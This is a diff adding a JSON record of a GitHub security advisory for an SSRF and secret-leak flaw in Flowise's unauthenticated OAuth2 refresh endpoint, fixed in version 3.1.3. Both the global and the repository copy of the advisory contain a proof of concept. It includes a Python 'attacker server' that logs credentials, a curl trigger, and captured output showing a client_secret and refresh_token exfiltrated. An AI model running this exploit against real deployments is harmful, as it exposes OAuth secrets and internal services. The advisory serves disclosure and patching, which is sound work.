@@ -1,0 +1,99 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-69250",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 0,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 8.5,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-639"
+    ],
+    "description": "### Summary\n\nThe OAuth2 token refresh endpoint (`POST /api/v1/oauth2-credential/refresh/:credentialId`) is unauthenticated by design (it is in the public whitelist) and performs a server-side HTTP request to a credential-controlled URL (`accessTokenUrl`) without SSRF protections. In runtime validation, this endpoint was reachable without auth, triggered outbound POST requests to an attacker-controlled server, and reflected the full remote response body to the caller (`tokenInfo`), confirming non-blind SSRF and credential secret exfiltration.\n\n### Details\n\nThe vulnerability is in `dist/routes/oauth2/index.js` (container runtime build), under path prefix `/api/v1/oauth2-credential`.\n\nConfirmed in runtime code:\n\n1. **Unauthenticated route via whitelist**\n   - `dist/utils/constants.js` includes:\n     - `/api/v1/oauth2-credential/callback`\n     - `/api/v1/oauth2-credential/refresh`\n   - `dist/index.js` auth middleware uses:\n     - `const isWhitelisted = whitelistURLs.some((url) => req.path.startsWith(url))`\n   - Therefore `/api/v1/oauth2-credential/refresh/:credentialId` is treated as whitelisted.\n\n2. **User-controlled SSRF target**\n   - In refresh handler (`dist/routes/oauth2/index.js`):\n     - loads credential by `credentialId`\n     - decrypts credential data\n     - reads `accessTokenUrl`\n     - executes:\n       - `axios.post(tokenUrl, new URLSearchParams(refreshRequestData).toString(), ...)`\n   - No `secureAxiosRequest()` / denylist wrapper is used in this path.\n\n3. **Non-blind response reflection**\n   - Response returns:\n     - `tokenInfo: { ...tokenData, ... }`\n   - `tokenData` is the attacker/internal server response body.\n\n4. **Secrets sent to SSRF target**\n   - Request body includes:\n     - `client_id`\n     - `client_secret`\n     - `grant_type=refresh_token`\n     - `refresh_token`\n\n### PoC\n\n#### Environment used\n\n- `flowiseai/flowise:latest` container (`localhost:3000`)\n- Attacker server (`localhost:18081`) returning JSON\n\n#### Step 1: Start attacker server\n\n```bash\npython3 -u - <<'PY'\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\n\nclass H(BaseHTTPRequestHandler):\n    def do_POST(self):\n        l = int(self.headers.get('Content-Length','0'))\n        b = self.rfile.read(l).decode('utf-8', errors='replace')\n        print('REQUEST_PATH', self.path, flush=True)\n        print('REQUEST_BODY', b, flush=True)\n        self.send_response(200)\n        self.send_header('Content-Type','application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps({'ok': True, 'source': 'attacker-server', 'echo_len': len(b)}).encode())\n    def log_message(self, fmt, *args):\n        pass\n\nHTTPServer(('0.0.0.0', 18081), H).serve_forever()\nPY\n```\n\n#### Step 2: Create OAuth2 credential with attacker `accessTokenUrl` (authenticated action)\n\nIn validation, this was done via authenticated API path (credential creation requires auth/permissions), then refresh was tested publicly.\n\nResulting credential ID used in runtime validation:\n\n- `24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef`\n\n#### Step 3: Trigger refresh **without auth**\n\n```bash\ncurl -i -X POST \\\n  http://127.0.0.1:3000/api/v1/oauth2-credential/refresh/24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef \\\n  -H 'Content-Type: application/json' \\\n  -d '{}'\n```\n\nObserved response:\n\n```json\n{\n  \"success\": true,\n  \"message\": \"OAuth2 token refreshed successfully\",\n  \"credentialId\": \"24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef\",\n  \"tokenInfo\": {\n    \"ok\": true,\n    \"source\": \"attacker-server\",\n    \"echo_len\": 76,\n    \"has_new_refresh_token\": false\n  }\n}\n```\n\nAttacker server logs captured:\n\n```text\nREQUEST_PATH /token\nREQUEST_BODY client_id=cid2&client_secret=csec2&grant_type=refresh_token&refresh_token=r2\n```\n\nThis confirms:\n- unauthenticated trigger,\n- server-side POST to attacker-controlled URL,\n- exfiltration of OAuth2 secrets in POST body,\n- full response reflection to client (`tokenInfo`).\n\n### Impact\n\n- **Vulnerability class:** Non-blind SSRF + sensitive secret exfiltration.\n- **Who can set up attack:** Any authenticated user who can create/update OAuth2 credentials.\n- **Who can trigger attack:** Anyone who knows a valid OAuth2 credential UUID (refresh endpoint is public/whitelisted).\n- **Technical impact:**\n  - outbound SSRF to attacker/internal targets,\n  - direct leak of `client_secret` and `refresh_token` to SSRF target,\n  - direct response read from target via API response (`tokenInfo`).\n- **Deployment impact:**\n  - cloud/internal network reachability can expose metadata/internal services depending on egress controls.",
+    "ghsa_id": "GHSA-r745-8hwv-h473",
+    "html_url": "https://github.com/advisories/GHSA-r745-8hwv-h473",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-r745-8hwv-h473"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-69250"
+      }
+    ],
+    "published_at": "2026-08-04T14:20:49Z",
+    "references": [
+      "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-r745-8hwv-h473",
+      "https://github.com/FlowiseAI/Flowise/commit/da8b251a9a4c59484ceaf6f71df7406aede7bef2",
+      "https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3",
+      "https://github.com/advisories/GHSA-r745-8hwv-h473"
+    ],
+    "severity": "high",
+    "summary": "Flowise: Unauthenticated OAuth2 Refresh Enables Non-Blind SSRF and Secret Exfiltration",
+    "updated_at": "2026-08-04T14:20:51Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "3.1.3",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "vulnerable_version_range": "<= 3.1.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-r745-8hwv-h473",
+  "repo": {
+    "cve_id": "CVE-2026-69250",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 8.5,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-639"
+    ],
+    "description": "### Summary\r\n\r\nThe OAuth2 token refresh endpoint (`POST /api/v1/oauth2-credential/refresh/:credentialId`) is unauthenticated by design (it is in the public whitelist) and performs a server-side HTTP request to a credential-controlled URL (`accessTokenUrl`) without SSRF protections. In runtime validation, this endpoint was reachable without auth, triggered outbound POST requests to an attacker-controlled server, and reflected the full remote response body to the caller (`tokenInfo`), confirming non-blind SSRF and credential secret exfiltration.\r\n\r\n### Details\r\n\r\nThe vulnerability is in `dist/routes/oauth2/index.js` (container runtime build), under path prefix `/api/v1/oauth2-credential`.\r\n\r\nConfirmed in runtime code:\r\n\r\n1. **Unauthenticated route via whitelist**\r\n   - `dist/utils/constants.js` includes:\r\n     - `/api/v1/oauth2-credential/callback`\r\n     - `/api/v1/oauth2-credential/refresh`\r\n   - `dist/index.js` auth middleware uses:\r\n     - `const isWhitelisted = whitelistURLs.some((url) => req.path.startsWith(url))`\r\n   - Therefore `/api/v1/oauth2-credential/refresh/:credentialId` is treated as whitelisted.\r\n\r\n2. **User-controlled SSRF target**\r\n   - In refresh handler (`dist/routes/oauth2/index.js`):\r\n     - loads credential by `credentialId`\r\n     - decrypts credential data\r\n     - reads `accessTokenUrl`\r\n     - executes:\r\n       - `axios.post(tokenUrl, new URLSearchParams(refreshRequestData).toString(), ...)`\r\n   - No `secureAxiosRequest()` / denylist wrapper is used in this path.\r\n\r\n3. **Non-blind response reflection**\r\n   - Response returns:\r\n     - `tokenInfo: { ...tokenData, ... }`\r\n   - `tokenData` is the attacker/internal server response body.\r\n\r\n4. **Secrets sent to SSRF target**\r\n   - Request body includes:\r\n     - `client_id`\r\n     - `client_secret`\r\n     - `grant_type=refresh_token`\r\n     - `refresh_token`\r\n\r\n### PoC\r\n\r\n#### Environment used\r\n\r\n- `flowiseai/flowise:latest` container (`localhost:3000`)\r\n- Attacker server (`localhost:18081`) returning JSON\r\n\r\n#### Step 1: Start attacker server\r\n\r\n```bash\r\npython3 -u - <<'PY'\r\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\r\nimport json\r\n\r\nclass H(BaseHTTPRequestHandler):\r\n    def do_POST(self):\r\n        l = int(self.headers.get('Content-Length','0'))\r\n        b = self.rfile.read(l).decode('utf-8', errors='replace')\r\n        print('REQUEST_PATH', self.path, flush=True)\r\n        print('REQUEST_BODY', b, flush=True)\r\n        self.send_response(200)\r\n        self.send_header('Content-Type','application/json')\r\n        self.end_headers()\r\n        self.wfile.write(json.dumps({'ok': True, 'source': 'attacker-server', 'echo_len': len(b)}).encode())\r\n    def log_message(self, fmt, *args):\r\n        pass\r\n\r\nHTTPServer(('0.0.0.0', 18081), H).serve_forever()\r\nPY\r\n```\r\n\r\n#### Step 2: Create OAuth2 credential with attacker `accessTokenUrl` (authenticated action)\r\n\r\nIn validation, this was done via authenticated API path (credential creation requires auth/permissions), then refresh was tested publicly.\r\n\r\nResulting credential ID used in runtime validation:\r\n\r\n- `24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef`\r\n\r\n#### Step 3: Trigger refresh **without auth**\r\n\r\n```bash\r\ncurl -i -X POST \\\r\n  http://127.0.0.1:3000/api/v1/oauth2-credential/refresh/24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{}'\r\n```\r\n\r\nObserved response:\r\n\r\n```json\r\n{\r\n  \"success\": true,\r\n  \"message\": \"OAuth2 token refreshed successfully\",\r\n  \"credentialId\": \"24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef\",\r\n  \"tokenInfo\": {\r\n    \"ok\": true,\r\n    \"source\": \"attacker-server\",\r\n    \"echo_len\": 76,\r\n    \"has_new_refresh_token\": false\r\n  }\r\n}\r\n```\r\n\r\nAttacker server logs captured:\r\n\r\n```text\r\nREQUEST_PATH /token\r\nREQUEST_BODY client_id=cid2&client_secret=csec2&grant_type=refresh_token&refresh_token=r2\r\n```\r\n\r\nThis confirms:\r\n- unauthenticated trigger,\r\n- server-side POST to attacker-controlled URL,\r\n- exfiltration of OAuth2 secrets in POST body,\r\n- full response reflection to client (`tokenInfo`).\r\n\r\n### Impact\r\n\r\n- **Vulnerability class:** Non-blind SSRF + sensitive secret exfiltration.\r\n- **Who can set up attack:** Any authenticated user who can create/update OAuth2 credentials.\r\n- **Who can trigger attack:** Anyone who knows a valid OAuth2 credential UUID (refresh endpoint is public/whitelisted).\r\n- **Technical impact:**\r\n  - outbound SSRF to attacker/internal targets,\r\n  - direct leak of `client_secret` and `refresh_token` to SSRF target,\r\n  - direct response read from target via API response (`tokenInfo`).\r\n- **Deployment impact:**\r\n  - cloud/internal network reachability can expose metadata/internal services depending on egress controls.\r\n\r\n",
+    "ghsa_id": "GHSA-r745-8hwv-h473",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-r745-8hwv-h473",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-r745-8hwv-h473"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-69250"
+      }
+    ],
+    "published_at": "2026-07-29T21:02:00Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Unauthenticated OAuth2 Refresh Enables Non-Blind SSRF and Secret Exfiltration",
+    "updated_at": "2026-08-04T14:17:38Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.3",
+        "vulnerable_version_range": "<= 3.1.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
